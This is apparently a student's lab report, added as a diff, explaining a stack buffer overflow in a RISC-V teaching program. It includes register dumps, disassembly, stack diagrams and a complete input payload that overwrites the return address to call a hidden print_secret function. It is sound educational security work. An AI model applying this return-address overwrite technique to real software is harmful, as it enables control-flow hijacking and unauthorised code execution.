@@ -1,0 +1,175 @@
+Student name: Nguyen Minh Duc
+Student ID: 20202026
+
+This is the report for the exercise 2 of lab 1
+
+Looking at the code, I noticed that at the line 20, the call to `print_secret` function is commented out so it should not print anything.
+
+However, when the python script is run, it magically printed "Ah! cBWTwTwC5eKAcDxpwx88".
+
+As the slide suggested, I tried to give 
+"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111ABCDEFGHBBBBCCCCL"
+as the input
+
+The simulator output the following error
+
+        z  0000000000000000 ra 0000000000000a4c sp 0000003ffffffb30 gp 000000000001f040
+        tp 0000000000000000 t0 0000000000000040 t1 3131313131313131 t2 0000000000000018
+        s0 4343434342424242 s1 0000000000000000 a0 0000003ffffffaa0 a1 000000000001f7a0
+        a2 0000003ffffffb28 a3 0000000000000000 a4 000000000000000a a5 0000000000000000
+        a6 ffffffffffffffff a7 000000000001f7a2 s2 0000000000000000 s3 0000000000000000
+        s4 0000000000000000 s5 0000000000000000 s6 0000000000000000 s7 0000000000000000
+        s8 0000000000000000 s9 0000000000000000 sA 0000000000000000 sB 0000000000000000
+        t3 3131313131313131 t4 3131313131313131 t5 3131313131313131 t6 3131313131313131
+        pc 0000000000000a4c va/inst 0000000000000a4c sr 8000000200006020
+        User fetch segfault @ 0x0000000000000a4c
+
+At first glance, the error message is expected since in the code, the line 17 and 18 have inconsistent array sizes
+
+        char buf[128];
+        fgets(buffer, 256, stdin);
+
+So I suspect it was some kind of buffer overflow bug in the code.
+
+Using the command `reg 0` when the program is waiting for the input, we obtain the expected return address is ra: 0xffffffc000000b6a
+
+        zero: 0x0000000000000000  ra: 0xffffffc000000b6a  sp: 0xffffffc00041bc40  gp: 0x000000000001f040
+          tp: 0x0000000000000000  t0: 0x0000003ffffff9f0  t1: 0x0000000000000000  t2: 0x0000000000000000
+          s0: 0xffffffc00000b000  s1: 0x000000008000e078  a0: 0x000000008000e078  a1: 0x0000000000000000
+          a2: 0x000000008041bc70  a3: 0xffffffffffffffff  a4: 0xffffffc0000170c0  a5: 0x0000000000000000
+          a6: 0x0000000000000000  a7: 0x0000000000000000  s2: 0x0000000000000000  s3: 0x000000000001fc60
+          s4: 0x0000000000000400  s5: 0xffffffc00000c000  s6: 0x0000000000000200  s7: 0x0000000000000000
+          s8: 0x0000000000000000  s9: 0x0000000000000000 s10: 0x0000000000000000 s11: 0x0000000000000000
+          t3: 0xffffffc000017028  t4: 0xffffffffffffffff  t5: 0x0000000000000001  t6: 0x0000000000002190
+
+After this, I tried the following command to decompile the binary file to see the assembly code
+
+        riscv64-unknown-elf-objdump -d sw/bof > bof.d
+
+Openning the file `bof.d` and inspect the `receive_input` function
+
+        00000000000101c4 <receive_input>:
+            101c4:	7175                	addi	sp,sp,-144
+            101c6:	e506                	sd	ra,136(sp)
+            101c8:	e122                	sd	s0,128(sp)
+            101ca:	0900                	addi	s0,sp,144
+            101cc:	6501b783          	ld	a5,1616(gp) # 1f690 <_impure_ptr>
+            101d0:	679c                	ld	a5,8(a5)
+            101d2:	863e                	mv	a2,a5
+            101d4:	10000593          	li	a1,256
+            101d8:	6d818513          	addi	a0,gp,1752 # 1f718 <buffer>
+            101dc:	118000ef          	jal	ra,102f4 <fgets>
+            101e0:	f7040713          	addi	a4,s0,-144
+            101e4:	6d818593          	addi	a1,gp,1752 # 1f718 <buffer>
+            101e8:	853a                	mv	a0,a4
+            101ea:	0a4010ef          	jal	ra,1128e <strcpy>
+            101ee:	0001                	nop
+            101f0:	60aa                	ld	ra,136(sp)
+            101f2:	640a                	ld	s0,128(sp)
+            101f4:	6149                	addi	sp,sp,144
+            101f6:	8082                	ret
+
+Here is the diagram of the current stack frame
+
+        |            | <-- s0: the top of the current stack frame
+        |////////////| <-- ra: the return address
+        |            | <-- sd: after the last element of buf[128]
+        |------------|       \
+        |\           |        |
+        | \          |        |
+        |  \         |        |
+        |   \        |        |
+        |    \       |        |
+        |     \      |         -> This area is the buf[128] array
+        |      \     |        |
+        |       \    |        |
+        |        \   |        |
+        |         \  |        |
+        |          \ |       /
+        |------------| <-- sp
+
+The line `fgets(buffer, 256, stdin)` accepts a string of length upto 256, which exceeds the size of buf[128].
+
+When the input length is longer than 128, the call `strcpy(buf, buffer)` could go above the `sd` address and could touch `ra`.
+
+The space between `sd` and `ra` does not affect the flow of the function, so when I reduce the length of the input down to 132 by giving
+"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111ABCDEFGHBBBB"
+the program terminates like normal.
+
+However, when the length is 135, something strange start to happens, by giving the extra 3 Cs
+"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111ABCDEFGHBBBBCCC"
+the program loop back to the beginning of the `run` function and ask for input again.
+
+Hence, somehow the return address is affected. If I give it one more C, i.e.
+"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111ABCDEFGHBBBBCCCC"
+the simulator outputs the following error
+
+        z  0000000000000000 ra 000000000001000a sp 0000003ffffffb30 gp 000000000001f040
+        tp 0000000000000000 t0 0000000000000040 t1 3131313131313131 t2 0000000000000018
+        s0 4343434342424242 s1 0000000000000000 a0 0000003ffffffaa0 a1 000000000001f7a0
+        a2 0000003ffffffb28 a3 0000000000000000 a4 0000000000000000 a5 000000000000000a
+        a6 ffffffffffffffff a7 000000000001f7a1 s2 0000000000000000 s3 0000000000000000
+        s4 0000000000000000 s5 0000000000000000 s6 0000000000000000 s7 0000000000000000
+        s8 0000000000000000 s9 0000000000000000 sA 0000000000000000 sB 0000000000000000
+        t3 3131313131313131 t4 3131313131313131 t5 3131313131313131 t6 3131313131313131
+        pc 000000000001000a va/inst 0000000000000000 sr 8000000200006020
+        An illegal instruction was executed!
+
+Which gives me different return address, not the expected one (0xffffffc000000b6a).
+
+Notice that at the end of `ra`, it has `0a` value, which in ASCII is the new line character.
+
+When I added one more L to the input (back to the slide's suggestion) the return address is now 0000000000000a4c
+
+Once again, notice that at the end of `ra`, it has `0a4c` value, which in ASCII are the new line character and the character L respectively.
+
+Therefore, it is possible to construct a string that can modify the return address into whatever we want.
+
+Since we want to invoke the `print_secret` function, we need to go to the `00000000000101a2` address
+
+        00000000000101a2 <print_secret>:
+            101a2:	1141                	addi	sp,sp,-16
+            101a4:	e406                	sd	ra,8(sp)
+            101a6:	e022                	sd	s0,0(sp)
+            101a8:	0800                	addi	s0,sp,16
+            101aa:	6481b783          	ld	a5,1608(gp) # 1f688 <secret>
+            101ae:	85be                	mv	a1,a5
+            101b0:	67f1                	lui	a5,0x1c
+            101b2:	60878513          	addi	a0,a5,1544 # 1c608 <__clzdi2+0x52>
+            101b6:	59d000ef          	jal	ra,10f52 <printf>
+            101ba:	0001                	nop
+            101bc:	60a2                	ld	ra,8(sp)
+            101be:	6402                	ld	s0,0(sp)
+            101c0:	0141                	addi	sp,sp,16
+            101c2:	8082                	ret
+
+Thus, we need to end the input string with `00000000000101a2` so that the return address will point to the exact address of the `print_secret` function
+
+To do this, we just need to append the ASCII character to the input, i.e. "\xa2\x01\x01\x00\x00\x00\x00\x00"
+
+Note that they are in reverse order of `00000000000101a2`. This is because of the stack mechanism
+
+        |                | <-- s0: the top of the current stack frame
+        |00000000000101a2| <-- ra: the return address
+        |\C\C\C\C\B\B\B\B| <-- sd: after the last element of buf[128]
+        |\H\G\F\E\D\C\B\A| \
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  | -> This area is the buf[128] array
+        |\1\1\1\1\1\1\1\1|  |  
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1|  |
+        |\1\1\1\1\1\1\1\1| /   <-- sp
+         
+This is why the input 
+'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111ABCDEFGHBBBBCCCC\xa2\x01\x01\x00\x00\x00\x00\x00'
+provided by the python script managed to make the program to print the secret string.
